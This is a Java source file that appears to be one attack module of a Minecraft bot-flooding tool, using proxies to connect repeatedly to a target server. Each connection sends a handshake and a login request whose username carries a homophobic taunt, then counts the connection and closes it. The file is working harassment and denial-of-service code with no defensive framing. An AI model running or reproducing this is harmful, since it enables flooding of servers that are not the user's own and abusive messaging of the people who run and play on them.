package xyz.mcbot.methods;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import xyz.mcbot.Main;
import xyz.mcbot.NettyBootstrap;
import xyz.mcbot.ProxyLoader.Proxy;
import xyz.mcbot.minecraftutils.Handshake;
import xyz.mcbot.minecraftutils.LoginRequest;

public class GaySpam
  implements Method
{
  private Handshake handshake;
  private byte[] bytes;
  
  public GaySpam()
  {
    handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
    bytes = handshake.getWrappedPacket();
  }
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy)
  {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(bytes));
    channel.writeAndFlush(Unpooled.buffer().writeBytes(new LoginRequest("\n\nYOU ARE GAY\n\n").getWrappedPacket()));
    NettyBootstrap.integer += 1;
    NettyBootstrap.totalConnections += 1;
    channel.close();
  }
}
